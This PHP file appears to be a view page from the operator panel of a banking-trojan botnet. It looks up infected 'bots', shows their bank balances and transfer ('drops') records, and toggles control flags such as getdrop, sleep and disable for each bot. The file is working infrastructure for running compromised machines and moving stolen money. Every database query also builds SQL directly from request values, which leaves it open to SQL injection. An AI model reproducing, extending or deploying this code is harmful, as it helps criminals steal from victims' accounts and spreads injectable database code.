<?php
//error_reporting(-1);

get_function('html_pages');

if(empty($Cur['y'])){
	$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
}else{
	$smarty->assign('rand_name', $Cur['y']);
}

function getdi(&$info){
	//$info = array_map('base64_decode', json_decode(base64_decode($info), true));
	//$info = json_decode(base64_decode($info), true);
	$info = json_decode(base64_decode($info));
	$info->drop->other = get_object_vars($info->drop->other);
	//print_rm($info);
	//return $info;
}

function system_get($row){
	global $systems;

	$systems[$row->nid] = $row->name;
}

function userid_name($userid){
	$cdb = 'cache/clients_list.json';
	if(file_exists($cdb)){
		$cl = @json_decode(@file_get_contents($cdb), true);
	}else{
		$cl = array();
	}
	
	if(!empty($cl[$userid])){
		return ucfirst($cl[$userid]);
	}else{
		return $userid;
	}
}

if(!empty($Cur['id'])){
	$bot = $mysqli->query('SELECT * FROM bf_bots WHERE (id = \''.$Cur['id'].'\') LIMIT 1');
	
	if($_SESSION['user']->config['infoacc'] == '1'){
		if($bot->id != $Cur['id']){
			$smarty->assign('nobot', true);
		}else{
			if($_SESSION['user']->config['systems'][$bot->system] != true){
				unset($bot);
				$smarty->assign('nobot', true);
			}
			
			if(!empty($_SESSION['user']->config['userid'])){
				if($_SESSION['user']->config['userid'] != $bot->userid){
					unset($bot);
					$smarty->assign('nobot', true);
				}
			}
		}
	}else{
		if($bot->id != $Cur['id']) $smarty->assign('nobot', true);
	}
}elseif(!empty($Cur['str'])){
	$matches = explode('0', $Cur['str'], 2);
	if(!empty($matches[0]) && !empty($matches[1])){
		$prefix = $matches[0];
		$uid = '0' . $matches[1];
	}

	if(!empty($prefix) && !empty($uid)){
		$bot = $mysqli->query('SELECT * FROM bf_bots WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') LIMIT 1');
		
		if($_SESSION['user']->config['infoacc'] == '1'){
			if($bot->prefix != $prefix || $bot->uid != $uid){
				$smarty->assign('nobot', true);
			}else{
				if($_SESSION['user']->config['systems'][$bot->system] == true){
					unset($bot);
					$smarty->assign('nobot', true);
				}
				
				if(!empty($_SESSION['user']->config['userid'])){
					if($_SESSION['user']->config['userid'] != $bot->userid){
						unset($bot);
						$smarty->assign('nobot', true);
					}
				}
			}
		}else{
			if($bot->prefix != $prefix || $bot->uid != $uid) $smarty->assign('nobot', true);
		}
	}else{
		 $smarty->assign('nobot', true);
	}
}

if($smarty->tpl_vars['nobot']->value != true){
	$bot->info = json_decode(base64_decode($bot->info), true);
	
	if(!empty($Cur['x'])){
		switch($Cur['x']){
			case 'getdrop':
				if($bot->info['getdrop'] == 1){
					$bot->info['getdrop'] = 0;
				}else{
					$bot->info['getdrop'] = 1;
				}
			break;
		
			case 'note':
				if($bot->info['note'] == 1){
					$bot->info['note'] = '';
				}else{
					$bot->info['note'] = 1;
				}
			break;
		
			case 'dsbld':
				if($bot->info['dsbld'] == 1){
					$bot->info['dsbld'] = 0;
				}else{
					$bot->info['dsbld'] = 1;
				}
			break;
			
			case 'slp':
				if($bot->info['slp'] == 1){
					$bot->info['slp'] = 0;
				}else{
					$bot->info['slp'] = 1;
				}
			break;
		
			case 'infrm':
				if($bot->info['infrm'] == 1){
					$bot->info['infrm'] = 0;
				}else{
					$bot->info['infrm'] = 1;
				}
			break;
		}
		$mysqli->query('update bf_bots set info = \''.base64_encode(json_encode($bot->info)).'\' WHERE (id = \''.$bot->id.'\')');
	}

	$bot->systems = $mysqli->query('SELECT id, nid, name, percent FROM bf_systems WHERE (nid = \''.$bot->system.'\') LIMIT 1');
	$bot->balance = $mysqli->query('SELECT * FROM bf_balance WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') AND (system = \''.$bot->system.'\') ORDER by post_date DESC', null, null, false);
	$bot->drops_data = $mysqli->query('SELECT * FROM bf_transfers WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') AND (system = \''.$bot->system.'\') ORDER by id DESC', null, null, false);
	$bot->logs = $mysqli->query('SELECT * FROM bf_logs WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') AND (system = \''.$bot->system.'\') ORDER by id DESC LIMIT ' . (($Cur['page'] == 0) ? 10 : $Cur['page']*10 . ',' . 10), null, null, false);
	$bot->logs_tech = $mysqli->query('SELECT * FROM bf_logs_tech WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') AND (system = \''.$bot->system.'\') ORDER by id DESC LIMIT ' . (($Cur['page'] == 0) ? 10 : $Cur['page']*10 . ',' . 10), null, null, false);
	$bot->logs_history = $mysqli->query('SELECT * FROM bf_logs_history WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') AND (system = \''.$bot->system.'\') ORDER by id DESC LIMIT ' . (($Cur['page'] == 0) ? 10 : $Cur['page']*10 . ',' . 10), null, null, false);

	$bot->logs_count = $mysqli->query_name('SELECT COUNT(id) count FROM bf_logs WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') AND (system = \''.$bot->system.'\')');
	$bot->logs_tech_count = $mysqli->query_name('SELECT COUNT(id) count FROM bf_logs_tech WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') AND (system = \''.$bot->system.'\')');
	$bot->logs_history_count = $mysqli->query_name('SELECT COUNT(id) count FROM bf_logs_history WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') AND (system = \''.$bot->system.'\')');
	
	$smarty->assign('logs_pages', html_pages('/bots/?', $bot->logs_count, 10, 1, 'gld', 'this'));
	$smarty->assign('logs_tech_pages', html_pages('/bots/?', $bot->logs_tech_count, 10, 1, 'gldt', 'this'));
	$smarty->assign('logs_history_pages', html_pages('/bots/?', $bot->logs_history_count, 10, 1, 'gldh', 'this'));
	//print_rm($bot);
	//$bot->drops_data->info = json_decode(base64_decode($bot->drops_data->info));
	$smarty->assign('bot', $bot);
}elseif(!empty($uid)){
	if($_SESSION['user']->config['infoacc'] == '1'){
		foreach($_SESSION['user']->config['systems'] as $key => $item){
			$sql .= ' OR (system = \''.$key.'\')';
		}
		$sql = preg_replace('~^ OR ~', '', $sql);
		
		if(!empty($sql)) $bot_uid = $mysqli->query('SELECT * FROM bf_bots WHERE ('.$sql.') AND (uid = \''.$uid.'\') LIMIT 1');
	}else{
		$bot_uid = $mysqli->query('SELECT * FROM bf_bots WHERE (uid = \''.$uid.'\') LIMIT 1');
	}
	
	if($bot_uid->uid == $uid) $smarty->assign('bot_uid', $bot_uid);
}

?>